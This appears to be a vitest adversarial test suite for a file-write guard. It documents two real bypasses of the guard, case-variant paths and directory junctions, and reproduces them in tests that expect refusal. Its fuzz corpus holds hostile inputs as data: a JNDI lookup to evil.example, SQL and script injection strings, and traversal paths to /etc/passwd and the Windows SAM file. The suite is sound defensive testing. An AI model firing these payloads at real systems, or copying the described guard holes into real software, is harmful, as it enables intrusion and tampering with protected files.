/**
 * IP-12 -- adversarial ("monkey") corpus for the reconciliation framework's
 * bucket-1 write guard (specs/changes/reconcile-framework). Every scenario
 * below targets a NAMED, known evasion class -- not random fuzzing -- per
 * design.md `## Open Risks`: "the adversarial corpus, not prose, is the
 * coverage evidence" for INV-2
 * (contracts/upgrade/upgrade-reconciliation-contract.md `## Invariants`,
 * `## Mechanical Enforcement`). Each `describe` block below is one numbered
 * category from the monkey-test-engineer work packet for this change.
 * Unit-level: imports `src/reconcile/{guard,classifier,registry}.ts`
 * directly (not the CLI), matching test/cli/reconcile-plan.test.ts's idiom.
 *
 * *** FINDING -- TWO real guard holes, not test defects. Reported `blocked`. ***
 *
 * (A) Case-variation evasion (`## 2` below). `guard.ts`'s `BUCKET_1_RULES`
 * matcher does exact, CASE-SENSITIVE string comparison against `relPosix`.
 * On a case-insensitive filesystem (Windows NTFS -- this repo's own
 * dev/CI platform; also default macOS), a destination that differs from an
 * enumerated bucket-1 pattern only in case (e.g. "Contracts/api.md" vs
 * "contracts/api.md") is NOT refused by `isBucket1`/`assertWritable`, and
 * `guardedWriteFile` PHYSICALLY overwrites the real bucket-1 file, because
 * the OS resolves both spellings to the SAME file. Reproduced below:
 * `guardedWriteFile` does not throw and the real fixture's content becomes
 * "HACKED". The matcher-level assertions (isBucket1/assertWritable
 * refusing a case-variant string) fail on ANY OS, since the bug is in the
 * string comparison itself, not merely its filesystem consequence.
 *
 * (B) Directory-junction evasion (`## 5` below). Neither `isBucket1` nor
 * `guardedWriteFile`/`guardedCopyFile` resolve `dest` through
 * `fs.realpathSync` before matching or writing. A directory JUNCTION
 * (creatable on Windows WITHOUT admin/Developer-Mode elevation -- confirmed
 * on this exact host) at a genuinely-bucket-2 path (e.g.
 * `specs/templates/`) that physically points into a bucket-1 directory
 * (e.g. `contracts/`) is classified by its bucket-2 SPELLING, and
 * `writeFileSync`/`copyFileSync` follow the reparse point and write straight
 * through to the real bucket-1 content. Reproduced below: after creating
 * the junction, `guardedWriteFile` at the bucket-2-looking path does not
 * throw, and the REAL `contracts/real.md` content becomes "HACKED VIA
 * JUNCTION".
 *
 * Both directly contradict ADR 0014's "A reconciler physically cannot write
 * a bucket-1 file" and contract INV-2's "NEVER flipped, mutated, or
 * overwritten by any upgrade path" -- the guard is the ONLY enforcement
 * point (INV-2: "NOT achieved by per-reconciler discipline"), so a matcher
 * gap here is not mitigated anywhere else in the design. The tests below
 * encode the CORRECT, safe expected behavior (refuse) and are RED against
 * the current implementation on this platform -- that is this corpus doing
 * its job, not a flaky or wrong test. See the final agent response /
 * agent-log for full reproduction and a recommended fix (resolve `dest` via
 * `fs.realpathSync.native` -- following any reparse point -- AND compare
 * case-insensitively whenever the host filesystem is case-insensitive,
 * before matching against `BUCKET_1_RULES`).
 */
import { describe, it, expect } from 'vitest';
import { existsSync, mkdirSync, writeFileSync, readFileSync, symlinkSync } from 'fs';
import { join, dirname, resolve } from 'path';
import { fileURLToPath } from 'url';
import { makeTempDir, cleanupDir } from '../helpers.js';
import { isBucket1, assertWritable, guardedWriteFile, makeGuardedWrite } from '../../src/reconcile/guard.js';
import { classifyPath, classifyPolicyKey } from '../../src/reconcile/classifier.js';
import { ReconcileRegistry } from '../../src/reconcile/registry.js';
import type { GuardedWrite, Reconciler } from '../../src/schemas/reconciliation.schema.js';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');

// -- determinism helpers (Tools: "every monkey test must seed its
// randomness; record the seed on failure for replay"). fast-check is not an
// installed dependency (reuse-first / out of this change's Allowed Paths for
// package.json) -- a tiny seeded PRNG needs no new dependency. -----------

const FUZZ_SEED = 424253;

/** mulberry32 -- deterministic, seeded, dependency-free PRNG. */
function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a |= 0; a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** Alphabet mixing path metacharacters, quote/script fragments, and
 *  Unicode boundary code points (control, ZWJ/ZWSP, RTL override, BOM) --
 *  the same boundary classes the Tools section names (SQL/JS injection,
 *  RTL, ZWJ, surrogate pairs, BOM). */
const ADV_CHARS = [
  ...'abcXYZ019 .', ...'../\\', ...'\'";<>${}%()',
  '\u0000', '\u200D', '\u200B', '\uFEFF', '\u202E', '\uD83D', '\uDE00',
];

function randomAdversarialString(rand: () => number, maxLen: number): string {
  const len = 1 + Math.floor(rand() * maxLen);
  let out = '';
  for (let i = 0; i < len; i++) out += ADV_CHARS[Math.floor(rand() * ADV_CHARS.length)];
  return out;
}

// -- OS capability probes (never assumed, never faked as a pass -- mirrors
// test/e2e/reconcile-plan.e2e.test.ts's CAN_SIMULATE_READ_DENIAL idiom). ---

/** Does THIS filesystem resolve two paths differing only in case to the
 *  SAME physical file? True on Windows NTFS (this repo's own platform) and
 *  default macOS; false on a case-sensitive Linux filesystem. Detected for
 *  real, never assumed from `process.platform` alone. */
const CASE_INSENSITIVE_FS: boolean = (() => {
  const dir = makeTempDir('cdd-case-fs-probe-');
  try {
    writeFileSync(join(dir, 'probe.txt'), 'x', 'utf8');
    return existsSync(join(dir, 'PROBE.TXT'));
  } catch {
    return false;
  } finally {
    cleanupDir(dir);
  }
})();

if (!CASE_INSENSITIVE_FS) {
  // eslint-disable-next-line no-console
  console.warn(
    '[reconcile-adversarial] this filesystem is case-SENSITIVE -- the physical ' +
    'case-collision proof test is SKIPPED (a case-varied path is a genuinely ' +
    'different, harmless file here). The matcher-level case-variation tests in ' +
    '`## 2` still run unconditionally -- the bug is in the string comparison, not ' +
    'the filesystem.',
  );
}

/** Can this host create a directory junction without elevation? True on
 *  ordinary (non-admin) Windows accounts; confirmed on this exact host.
 *  File-level symlinks additionally need admin/Developer Mode -- probed
 *  separately and used only as a best-effort supplementary case. */
const CAN_CREATE_JUNCTION: boolean = (() => {
  const dir = makeTempDir('cdd-junction-cap-probe-');
  try {
    mkdirSync(join(dir, 'target'), { recursive: true });
    symlinkSync(join(dir, 'target'), join(dir, 'link'), 'junction');
    return true;
  } catch {
    return false;
  } finally {
    cleanupDir(dir);
  }
})();

const CAN_CREATE_FILE_SYMLINK: boolean = (() => {
  const dir = makeTempDir('cdd-symlink-cap-probe-');
  try {
    writeFileSync(join(dir, 'target.txt'), 'x', 'utf8');
    symlinkSync(join(dir, 'target.txt'), join(dir, 'link.txt'), 'file');
    return true;
  } catch {
    return false;
  } finally {
    cleanupDir(dir);
  }
})();

if (!CAN_CREATE_JUNCTION) {
  // eslint-disable-next-line no-console
  console.warn(
    '[reconcile-adversarial] this host cannot create a directory junction -- the ' +
    'junction-into-bucket-1 proof test is SKIPPED via it.skipIf, not faked as a pass.',
  );
}
if (!CAN_CREATE_FILE_SYMLINK) {
  // eslint-disable-next-line no-console
  console.warn(
    '[reconcile-adversarial] this host cannot create a file-level symlink without ' +
    'elevation (no admin token / Developer Mode) -- the supplementary file-symlink ' +
    'test is SKIPPED via it.skipIf, not faked as a pass. The junction proof above ' +
    '(directory-level, no elevation required) still runs unconditionally where ' +
    'CAN_CREATE_JUNCTION is true.',
  );
}

// =============================================================================
// 1. Path-normalization evasion
// =============================================================================
// Failure mode: a dot-segment / double-slash / redundant-segment / leading
// "./" / trailing-slash / mixed-`\`-`/`-separator form of an enumerated
// bucket-1 path reaches the guard unrefused -- the exact evasion class named
// in the work packet ("the exact class that bit enforceConfirmationHookInstallation
// in [ci 0.8.0]"). `assertWritable` calls `path.resolve()` before matching,
// so every case below is expected -- and confirmed -- to be refused.

describe('1. Path-normalization evasion (INV-2)', () => {
  const NORMALIZATION_EVASIONS: Array<{ input: string; label: string }> = [
    { input: 'contracts/./api.md', label: 'dot-segment' },
    { input: 'contracts//api.md', label: 'double-slash' },
    { input: 'contracts/../contracts/api.md', label: 'redundant up-then-down segment' },
    { input: './contracts/api.md', label: 'leading dot-segment' },
    { input: 'contracts/api.md/', label: 'trailing slash' },
    { input: 'contracts/subdir/../api.md', label: 'redundant segment mid-path' },
    { input: String.raw`contracts\api.md`, label: 'backslash separator on a forward-slash-authored rule' },
    { input: String.raw`contracts\subdir\file.md`, label: 'all-backslash separators, nested' },
    { input: '.cdd/./policy.yml', label: 'dot-segment inside a .cdd/ exact-file rule' },
    { input: '.cdd//policy.yml', label: 'double-slash inside a .cdd/ exact-file rule' },
    { input: './CLAUDE.md', label: 'leading dot-segment on an exact-list rule' },
    { input: 'sub/../acceptance.yml', label: 'redundant segment resolving to a top-level exact-list rule' },
    { input: 'nested/acceptance.yml', label: 'nested acceptance.yml matches the endsWith(/acceptance.yml) rule' },
    { input: '.cdd/../.cdd/design-lock.json', label: 'redundant segment on a *-lock.json regex rule' },
  ];

  for (const { input, label } of NORMALIZATION_EVASIONS) {
    it(`guard-refusal (normalization: ${label}): assertWritable throws for ${JSON.stringify(input)}`, () => {
      expect(() => assertWritable(input, REPO_ROOT)).toThrow(/bucket-1/);
    });
  }
});

// =============================================================================
// 2. Case-variation evasion -- REAL FINDING (A), see file header
// =============================================================================
// Failure mode: a case-differing spelling of an enumerated bucket-1 path is
// not refused. `BUCKET_1_RULES`' `test` functions compare `relPosix` with
// `===`/`.includes()`/`.startsWith()`/`.endsWith()`/a case-sensitive RegExp
// -- all case-sensitive. These tests assert the CORRECT, safe semantics
// (refuse on a case-insensitive match) and are expected to FAIL against the
// current implementation.

describe('2. Case-variation evasion (INV-2) -- KNOWN GUARD HOLE, see file header Finding (A)', () => {
  const CASE_EVASIONS: Array<{ input: string; label: string }> = [
    { input: 'Contracts/api.md', label: 'rule 1 (contracts/** prefix)' },
    { input: 'SRC/index.ts', label: 'rule 1 (src/** prefix)' },
    { input: 'TESTS/unit/foo.test.ts', label: 'rule 1 (tests/** prefix, excl. tests/templates/)' },
    { input: 'Specs/Changes/x/tasks.yml', label: 'rule 1 (specs/changes/** prefix)' },
    { input: 'claude.md', label: 'rule 2 (exact-list CLAUDE.md, lowercase)' },
    { input: 'Claude.MD', label: 'rule 2 (exact-list CLAUDE.md, mixed case)' },
    { input: 'Package.JSON', label: 'rule 2 (exact-list package.json)' },
    { input: '.CDD/policy.yml', label: 'rule 3 (.cdd/policy.yml exact file)' },
    { input: '.cdd/Context-Policy.json', label: 'rule 3 (.cdd/context-policy.json exact file)' },
    { input: 'ACCEPTANCE.yml', label: 'rule 4 (acceptance.yml exact/endsWith)' },
    { input: 'Interaction-Design.md', label: 'rule 4 (interaction-design.md exact/endsWith)' },
  ];

  for (const { input, label } of CASE_EVASIONS) {
    it(`guard-refusal (case-variation: ${label}): assertWritable SHOULD throw for ${JSON.stringify(input)} (matcher is case-sensitive on ANY OS -- this is not filesystem-dependent)`, () => {
      expect(() => assertWritable(input, REPO_ROOT)).toThrow(/bucket-1/);
    });
  }

  it.skipIf(!CASE_INSENSITIVE_FS)(
    'PHYSICAL PROOF: guardedWriteFile with a case-differing destination clobbers the REAL bucket-1 file on disk',
    () => {
      const tmp = makeTempDir('cdd-case-collision-');
      try {
        mkdirSync(join(tmp, 'contracts'), { recursive: true });
        const canonicalPath = join(tmp, 'contracts', 'api.md');
        writeFileSync(canonicalPath, 'ORIGINAL BUCKET-1 CONTENT', 'utf8');
        const caseVariantDest = join(tmp, 'Contracts', 'api.md');

        // Non-vacuous precondition: prove the two spellings really are the
        // same physical file on THIS filesystem before asserting anything.
        expect(
          existsSync(caseVariantDest),
          'sanity: this host must actually be case-insensitive for this proof to mean anything',
        ).toBe(true);

        expect(() => guardedWriteFile(caseVariantDest, 'HACKED', tmp)).toThrow(/bucket-1/);
        expect(readFileSync(canonicalPath, 'utf8')).toBe('ORIGINAL BUCKET-1 CONTENT');
      } finally {
        cleanupDir(tmp);
      }
    },
  );
});

// =============================================================================
// 3. Absolute vs relative target
// =============================================================================
// Failure mode: an absolute-path spelling of a bucket-1 file evades a
// matcher that only correctly handles relative forms.

describe('3. Absolute vs relative target (INV-2)', () => {
  const RULE_SAMPLES = ['contracts/api.md', 'CLAUDE.md', '.cdd/policy.yml', 'acceptance.yml'];
  for (const rel of RULE_SAMPLES) {
    it(`assertWritable refuses ${JSON.stringify(rel)} identically as a relative and an absolute path`, () => {
      const abs = resolve(REPO_ROOT, rel);
      expect(() => assertWritable(rel, REPO_ROOT)).toThrow(/bucket-1/);
      expect(() => assertWritable(abs, REPO_ROOT)).toThrow(/bucket-1/);
    });
  }
});

// =============================================================================
// 4. Path-traversal escape
// =============================================================================
// Failure mode: a `..`-laden destination that resolves OUTSIDE cwd is
// misclassified as writable-and-then-clobbers a REAL bucket-1 path inside
// cwd. The guard's contractual scope is the enumerated set INSIDE the
// adopter project (contracts/upgrade/upgrade-reconciliation-contract.md
// `## Bucket 1`); a path resolving outside cwd is not part of that
// enumeration, so `isBucket1` correctly does not claim to police it -- this
// is a documented scope boundary. What matters for safety is that such an
// escape can never accidentally land ON TOP OF a real in-cwd bucket-1 file
// instead of genuinely outside it.

describe('4. Path-traversal escape -- guard scope boundary, safety proven', () => {
  it('a destination resolving outside cwd is not matched as bucket-1 (documented scope boundary, not a hole by itself)', () => {
    expect(isBucket1('../../etc/x', REPO_ROOT).blocked).toBe(false);
    expect(isBucket1(String.raw`..\..\etc\x`, REPO_ROOT).blocked).toBe(false);
  });

  it('SAFETY PROOF: an escaping destination never lands on (or is misreported as refusing) the REAL in-cwd bucket-1 file', () => {
    const tmp = makeTempDir('cdd-traversal-outer-');
    try {
      const cwdDir = join(tmp, 'project');
      mkdirSync(join(cwdDir, 'contracts'), { recursive: true });
      const realBucket1 = join(cwdDir, 'contracts', 'api.md');
      writeFileSync(realBucket1, 'REAL GROUND TRUTH', 'utf8');

      // An ABSOLUTE destination one level above cwdDir -- relative to cwdDir
      // this resolves to `../outside-escape.md` (no bucket-1 rule matches a
      // relPosix starting with ".."). Using an absolute dest (not a bare
      // relative string) here is deliberate: guardedWriteFile's fs calls use
      // `dest` verbatim, not re-joined against `cwd` (see guard.ts) -- a bare
      // relative dest would resolve against the REAL vitest process cwd
      // (this repo), not the fixture, which this test must not touch.
      const escapeDest = join(tmp, 'outside-escape.md');
      expect(isBucket1(escapeDest, cwdDir).blocked).toBe(false);
      expect(() => guardedWriteFile(escapeDest, 'ESCAPED WRITE', cwdDir)).not.toThrow();

      // The real bucket-1 file inside cwd is untouched...
      expect(readFileSync(realBucket1, 'utf8')).toBe('REAL GROUND TRUTH');
      // ...and the escaping write landed exactly where path math says it
      // must -- outside cwd, never re-entering the bucket-1 directory.
      expect(readFileSync(escapeDest, 'utf8')).toBe('ESCAPED WRITE');
    } finally {
      cleanupDir(tmp);
    }
  });
});

// =============================================================================
// 5. Symlink / junction into bucket-1 -- REAL FINDING (B), see file header
// =============================================================================
// Failure mode: a bucket-2-looking path is actually a symlink/junction whose
// target resolves into a bucket-1 location. Neither `isBucket1` nor the
// guarded writers resolve `dest` through `fs.realpathSync` before matching
// or writing, so a write that is legitimately classified bucket-2 by its
// own spelling follows the reparse point straight through to the real
// bucket-1 content. Directory junctions need no Windows elevation
// (confirmed on this host) -- this is not a best-effort/rare case.

describe('5. Symlink / junction into bucket-1 (INV-2) -- KNOWN GUARD HOLE, see file header Finding (B)', () => {
  it.skipIf(!CAN_CREATE_JUNCTION)(
    'PHYSICAL PROOF: a specs/templates/ (bucket-2) directory that is a JUNCTION into contracts/ (bucket-1) lets guardedWriteFile clobber the real bucket-1 file',
    () => {
      const tmp = makeTempDir('cdd-junction-');
      try {
        const targetDir = join(tmp, 'contracts');
        mkdirSync(targetDir, { recursive: true });
        const realFile = join(targetDir, 'real.md');
        writeFileSync(realFile, 'REAL BUCKET-1 CONTENT', 'utf8');

        const linkDir = join(tmp, 'specs', 'templates');
        mkdirSync(dirname(linkDir), { recursive: true });
        symlinkSync(targetDir, linkDir, 'junction');

        const throughJunction = join(linkDir, 'real.md');
        // Non-vacuous precondition: the junction really does alias the two
        // directories on THIS filesystem before asserting anything.
        expect(readFileSync(throughJunction, 'utf8'), 'sanity: junction must alias contracts/').toBe('REAL BUCKET-1 CONTENT');

        expect(() => guardedWriteFile(throughJunction, 'HACKED VIA JUNCTION', tmp)).toThrow(/bucket-1/);
        expect(readFileSync(realFile, 'utf8')).toBe('REAL BUCKET-1 CONTENT');
      } finally {
        cleanupDir(tmp);
      }
    },
  );

  it.skipIf(!CAN_CREATE_FILE_SYMLINK)(
    'supplementary (best-effort, needs elevation): a bucket-2-looking FILE that is a symlink into a bucket-1 file is refused by guardedWriteFile',
    () => {
      const tmp = makeTempDir('cdd-filesymlink-');
      try {
        mkdirSync(join(tmp, 'contracts'), { recursive: true });
        const realFile = join(tmp, 'contracts', 'real.md');
        writeFileSync(realFile, 'REAL BUCKET-1 CONTENT', 'utf8');

        const linkPath = join(tmp, 'specs', 'templates', 'sneaky.md');
        mkdirSync(dirname(linkPath), { recursive: true });
        symlinkSync(realFile, linkPath, 'file');

        expect(() => guardedWriteFile(linkPath, 'HACKED VIA SYMLINK', tmp)).toThrow(/bucket-1/);
        expect(readFileSync(realFile, 'utf8')).toBe('REAL BUCKET-1 CONTENT');
      } finally {
        cleanupDir(tmp);
      }
    },
  );
});

// =============================================================================
// 6. .cdd/policy.yml per-key adversary
// =============================================================================
// Failure mode: an adopter-set key's VALUE is flipped/overwritten, or a
// genuinely-new key silently applies as an enforcing default instead of
// reconciling (contract `## .cdd/policy.yml is classified PER-KEY`).

describe('6. .cdd/policy.yml per-key adversary (INV-1/INV-2)', () => {
  it('an adopter-set key with an adversarial (SQL/script-like) VALUE still classifies keep -- disposition depends only on key PRESENCE, never on value content', () => {
    const tmp = makeTempDir('cdd-policy-adversary-');
    try {
      mkdirSync(join(tmp, '.cdd'), { recursive: true });
      const adversarialYaml =
        'shadow_mode: "\'; DROP TABLE policy; --"\n' +
        'weird_key: "<script>alert(1)</script>"\n' +
        'unicode_key: true\n';
      writeFileSync(join(tmp, '.cdd', 'policy.yml'), adversarialYaml, 'utf8');

      expect(classifyPolicyKey('shadow_mode', true).bucket).toBe('keep');
      expect(classifyPolicyKey('weird_key', true).bucket).toBe('keep');
      expect(classifyPolicyKey('shadow_mode', true).reason).toContain('never flipped');
    } finally {
      cleanupDir(tmp);
    }
  });

  it('a genuinely-new key NEVER classifies keep or replace -- always reconcile with a safe, non-blocking default (INV-1)', () => {
    const d = classifyPolicyKey('brand_new_enforcing_sounding_flag', false);
    expect(d.bucket).toBe('reconcile');
    expect(d.action).toBe('needs-reconcile');
  });

  it(`seeded fuzz (seed=${FUZZ_SEED}): classifyPolicyKey never throws, never returns bucket "replace", and never flips an adopter-set/undeterminable key away from keep -- 200 adversarial key names x all 3 adopterHasKey states`, () => {
    const rand = mulberry32(FUZZ_SEED);
    for (let i = 0; i < 200; i++) {
      const key = randomAdversarialString(rand, 30);
      for (const adopterHasKey of [true, false, 'unknown'] as const) {
        const ctx = `seed=${FUZZ_SEED} i=${i} key=${JSON.stringify(key)} adopterHasKey=${adopterHasKey}`;
        let d;
        expect(() => { d = classifyPolicyKey(key, adopterHasKey); }, ctx).not.toThrow();
        expect(d!.bucket, ctx + ' -- bucket "replace" is never a valid policy-key disposition').not.toBe('replace');
        if (adopterHasKey === true) {
          expect(d!.bucket, ctx + ' -- adopter-set key must stay keep (INV-2)').toBe('keep');
        }
        if (adopterHasKey === 'unknown') {
          expect(d!.bucket, ctx + ' -- undeterminable adopter-file state must fail open to keep (INV-1)').toBe('keep');
        }
      }
    }
  });
});

// =============================================================================
// 7. Deeply-nested / overlong path, unicode & control characters, empty
//    string, directory-shadowing-a-file
// =============================================================================
// Failure mode: any of these crash the plan pass, or resolve to a bucket
// other than the safe default (refuse if bucket-1, else keep).

describe('7. Deeply-nested / overlong / unicode / control / empty / dir-as-file (INV-1/INV-2)', () => {
  it('a deeply-nested (50-segment) path under a bucket-1 root is still refused, not lost in recursion/normalization', () => {
    const deep = 'contracts/' + 'a/'.repeat(50) + 'x.md';
    expect(() => assertWritable(deep, REPO_ROOT)).toThrow(/bucket-1/);
  });

  it('an overlong (3000-char) filename under a bucket-1 root is still refused', () => {
    const overlong = 'contracts/' + 'x'.repeat(3000) + '.md';
    expect(() => assertWritable(overlong, REPO_ROOT)).toThrow(/bucket-1/);
  });

  const UNICODE_UNDER_BUCKET1: Array<[string, string]> = [
    ['ZWJ/ZWSP', 'contracts/\u200D\u200Bfile.md'],
    ['RTL override', 'contracts/\u202Efile.md'],
    ['BOM-prefixed', 'contracts/\uFEFFfile.md'],
    ['surrogate-pair emoji', 'contracts/\uD83D\uDE00.md'],
    ['embedded NUL', 'contracts/file\u0000name.md'],
  ];
  for (const [label, p] of UNICODE_UNDER_BUCKET1) {
    it(`unicode/control-char filename (${label}) under a bucket-1 root is still refused`, () => {
      expect(() => assertWritable(p, REPO_ROOT)).toThrow(/bucket-1/);
    });
  }

  it('the same unicode/control-char corpus applied to an UNCLASSIFIED root never crashes classifyPath and fails open to keep', () => {
    const cases = [
      '\u200D\u200Bunclassified.md',
      '\u202Eunclassified.md',
      '\uFEFFunclassified.md',
      '\uD83D\uDE00unclassified.md',
      'unclassified\u0000name.md',
    ];
    for (const c of cases) {
      expect(() => classifyPath(c, REPO_ROOT), JSON.stringify(c)).not.toThrow();
      expect(classifyPath(c, REPO_ROOT).bucket, JSON.stringify(c)).toBe('keep');
    }
  });

  it('empty string classifies keep and does not crash the classifier; the raw guard neither refuses nor writes anything real', () => {
    expect(() => classifyPath('', REPO_ROOT)).not.toThrow();
    expect(classifyPath('', REPO_ROOT).bucket).toBe('keep');
    // isBucket1('') resolves to cwd itself; no rule matches an empty
    // relPosix, so the raw guard does not refuse it either -- safe because
    // "" denotes no real bucket-1 enumerated file, only the CLI's own cwd.
    // Documented here, not asserted as a throw.
    expect(isBucket1('', REPO_ROOT).blocked).toBe(false);
  });

  it('assertWritable refuses the bucket-1 root DIRECTORY itself, not only files under it', () => {
    expect(() => assertWritable('contracts', REPO_ROOT)).toThrow(/bucket-1/);
    expect(() => assertWritable('src', REPO_ROOT)).toThrow(/bucket-1/);
  });

  it('a directory sitting where a bucket-2 file is expected (interrupted install/extraction, EISDIR-class fault): classifyPath fails open to keep, no crash', () => {
    const tmp = makeTempDir('cdd-dir-as-file-');
    try {
      const targetPath = join(tmp, 'specs', 'templates', 'change-classification.md');
      mkdirSync(targetPath, { recursive: true }); // a DIRECTORY sits where a file is expected
      writeFileSync(join(targetPath, 'unexpected.txt'), 'oops', 'utf8');
      expect(() => classifyPath('specs/templates/change-classification.md', tmp)).not.toThrow();
      expect(classifyPath('specs/templates/change-classification.md', tmp).bucket).toBe('keep');
    } finally {
      cleanupDir(tmp);
    }
  });
});

// =============================================================================
// 8. Registry adversary
// =============================================================================
// Failure mode: a reconciler bypasses the single guarded writer and writes
// a bucket-1 path directly (ADR 0014: "A reconciler physically cannot write
// a bucket-1 file").

describe('8. Registry adversary -- a reconciler cannot bypass GuardedWrite (AC-2/AC-3/INV-2)', () => {
  it('a malicious reconciler whose apply() targets a canonical-case bucket-1 path via GuardedWrite.writeFile is refused -- the write never happens', () => {
    const registry = new ReconcileRegistry();
    const write = makeGuardedWrite(REPO_ROOT);
    let attemptedWrite = false;
    const malicious: Reconciler = {
      surface: 'malicious-canonical-writefile',
      detectNeedsReconcile: () => true,
      planDescription: () => 'pretends to be a legitimate bucket-3 migration',
      apply: (_ctx, w: GuardedWrite) => {
        attemptedWrite = true;
        w.writeFile('contracts/PWNED_BY_RECONCILER.md', 'pwned');
        return { surface: 'malicious-canonical-writefile', applied: true, detail: 'pwned' };
      },
    };
    registry.register(malicious);
    expect(() => registry.list()[0].apply({ cwd: REPO_ROOT }, write)).toThrow(/bucket-1/);
    expect(attemptedWrite).toBe(true); // the reconciler DID try -- proves the guard, not caller discipline, stopped it
    expect(existsSync(join(REPO_ROOT, 'contracts', 'PWNED_BY_RECONCILER.md'))).toBe(false);
  });

  it('a malicious reconciler using GuardedWrite.copyFile (not writeFile) against a bucket-1 target is also refused', () => {
    const registry = new ReconcileRegistry();
    const write = makeGuardedWrite(REPO_ROOT);
    const srcFile = join(REPO_ROOT, 'package.json'); // any real readable file as a copy source
    const malicious: Reconciler = {
      surface: 'malicious-canonical-copyfile',
      detectNeedsReconcile: () => true,
      planDescription: () => 'pretends to migrate a src/ file',
      apply: (_ctx, w: GuardedWrite) => {
        w.copyFile(srcFile, 'src/PWNED_COPY.ts');
        return { surface: 'malicious-canonical-copyfile', applied: true, detail: 'pwned' };
      },
    };
    registry.register(malicious);
    expect(() => registry.list()[0].apply({ cwd: REPO_ROOT }, write)).toThrow(/bucket-1/);
    expect(existsSync(join(REPO_ROOT, 'src', 'PWNED_COPY.ts'))).toBe(false);
  });

  it('CROSS-REFERENCE to Finding (A): a malicious reconciler using a CASE-VARIANT bucket-1 path via GuardedWrite is NOT refused -- same matcher gap as `## 2`, reachable through the registry too (proves ADR 0014\'s "physically cannot" claim does not hold for this input class)', () => {
    const tmp = makeTempDir('cdd-registry-case-hole-');
    try {
      mkdirSync(join(tmp, 'contracts'), { recursive: true });
      writeFileSync(join(tmp, 'contracts', 'real.md'), 'REAL', 'utf8');
      const write = makeGuardedWrite(tmp);
      const malicious: Reconciler = {
        surface: 'malicious-case-variant',
        detectNeedsReconcile: () => true,
        planDescription: () => 'evil',
        apply: (_ctx, w: GuardedWrite) => {
          w.writeFile(join(tmp, 'Contracts', 'real.md'), 'HACKED');
          return { surface: 'malicious-case-variant', applied: true, detail: 'pwned' };
        },
      };
      expect(() => malicious.apply({ cwd: tmp }, write)).toThrow(/bucket-1/);
      expect(readFileSync(join(tmp, 'contracts', 'real.md'), 'utf8')).toBe('REAL');
    } finally {
      cleanupDir(tmp);
    }
  });
});

// =============================================================================
// 9. Seeded fuzz corpus (property: fail-open is total, not merely tested on
//    curated examples)
// =============================================================================

describe('9. Seeded fuzz corpus -- classifyPath fail-open is total over adversarial input (deterministic, seed recorded for replay)', () => {
  it(`classifyPath: 300 pseudo-random adversarial strings (seed=${FUZZ_SEED}) never throw and always fail open to keep`, () => {
    const rand = mulberry32(FUZZ_SEED);
    for (let i = 0; i < 300; i++) {
      const p = randomAdversarialString(rand, 60);
      const ctx = `seed=${FUZZ_SEED} i=${i} input=${JSON.stringify(p)}`;
      let d;
      expect(() => { d = classifyPath(p, REPO_ROOT); }, ctx).not.toThrow();
      expect(d!.bucket, ctx + ' -- fail-open (INV-1) violated').toBe('keep');
    }
  });

  it('curated SQL-like / script-like / injection / numeric-boundary corpus never throws and fails open to keep', () => {
    const CURATED = [
      "'; DROP TABLE policy; --",
      "' OR '1'='1",
      '<script>alert(document.cookie)</script>',
      '${jndi:ldap://evil.example/a}',
      '../../../../etc/passwd',
      String.raw`..\..\..\Windows\System32\config\SAM`,
      'contracts/${__proto__}',
      '__proto__',
      'constructor.prototype.polluted',
      'NaN', 'Infinity', '-Infinity', 'null', 'undefined',
      String(Number.MAX_SAFE_INTEGER), String(-Number.MAX_SAFE_INTEGER),
    ];
    for (const p of CURATED) {
      expect(() => classifyPath(p, REPO_ROOT), JSON.stringify(p)).not.toThrow();
      expect(classifyPath(p, REPO_ROOT).bucket, JSON.stringify(p)).toBe('keep');
    }
  });
});
